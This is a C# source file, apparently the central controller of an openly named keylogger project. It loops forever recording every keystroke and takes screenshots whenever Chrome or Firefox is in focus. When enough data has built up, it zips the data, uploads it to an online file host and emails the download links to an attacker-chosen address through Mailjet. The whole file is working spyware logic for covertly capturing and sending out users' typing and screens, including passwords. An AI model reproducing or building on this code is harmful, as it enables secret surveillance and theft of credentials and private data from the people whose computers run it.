using Keylogger.Mail;
using Keylogger.Upload;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Input;

namespace Keylogger
{
    /// <summary>
    /// Controlls flow of the keylogger
    /// </summary>
    public class Controller
    {
        // Processes names or empty if we want to make screenshots all the time
        private HashSet<string> TrackedProcesses = new HashSet<string>(new string[]
        {
            "chrome",
            "firefox"
        });
        private readonly int ScreenSnapshotInterval = 3000; // Interval for getting screen snapshots
        private readonly int UploadMinInterval = 30000; // Interval of determining whether local storage is full and upload should be made
        private readonly int MaxUploadSizeMB = 100;      //  After reaching this size, upload should be made
        private readonly IOnlineService[] OnlineServices = new IOnlineService[]   // Online storages for uploading gathered data
        {
            new ExpireBox()
        };
        private readonly string MailJetPublicKey = "";        // Public key for Mailjet service - sending mail
        private readonly string MailJetPrivateKey = "";       // Private key for Mailjet service - sending mail
        private readonly IMailProvider Mailprovider;          // Mail provider for sending mails
        private readonly string TargetMail = "mail@example.com";  // Mail where links to gathered data will be sent




        public Controller()
        {
            Mailprovider = new MailJet(MailJetPublicKey, MailJetPrivateKey);
        }




        /// <summary>
        /// Starts infinite run of the keylogger
        /// </summary>
        public void StartMonitor()
        {
            DataSource dataSource = new DataSource();
            LocalStorage localStorage = new LocalStorage(MaxUploadSizeMB);

            int milisecondsSlept = 0;
            while (true)
            {
                // Get pressed keys and saves them
                List<Key> pressedKeys = dataSource.GetNewPressedKeys();
                if (pressedKeys.Any())
                    localStorage.SaveKeys(pressedKeys);

                // Make screen snapshots - but not every milisecond
                if (milisecondsSlept % ScreenSnapshotInterval == 0)
                {
                    // We dont'want to track specified process - make a capture
                    if (!TrackedProcesses.Any())
                        localStorage.SaveScreenSnapshot(dataSource.GetScreenSnapshot());
                    else
                    {
                        // Save scren snapshot only when window with tracked process is active
                        string activeProcessName = dataSource.GetActiveWindowProcessName().ToLower();
                        if (TrackedProcesses.Contains(activeProcessName))
                            localStorage.SaveScreenSnapshot(dataSource.GetScreenSnapshot());
                    }
                }

                // Upload if needed
                if (milisecondsSlept % UploadMinInterval == 0 && localStorage.IsFull() && InternetWorks())
                {
                    // Generate ZIP file
                    string zipFile = localStorage.PackToZip();

                    // Upload to all online services
                    List<string> urls = new List<string>();
                    foreach (IOnlineService onlineService in OnlineServices)
                        urls.Add(onlineService.Upload(zipFile));

                    // Clear local storage
                    localStorage.Clear();

                    // Send mail with URLs
                    Mailprovider.SendMail(TargetMail, "KeyLogger", String.Join("\r\n", urls));
                }

                // Sleep for one milisend
                Thread.Sleep(1);

                // Prevent integer overflow
                milisecondsSlept = ++milisecondsSlept % 1000000;
            }
        }




        /// <summary>
        /// Functions check whether internet connection is available by checking google.com
        /// </summary>
        /// <returns>True if internet connection is up</returns>
        private bool InternetWorks()
        {
            try
            {
                using (WebClient wc = new WebClient())
                    wc.DownloadString("https://www.google.com/");

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
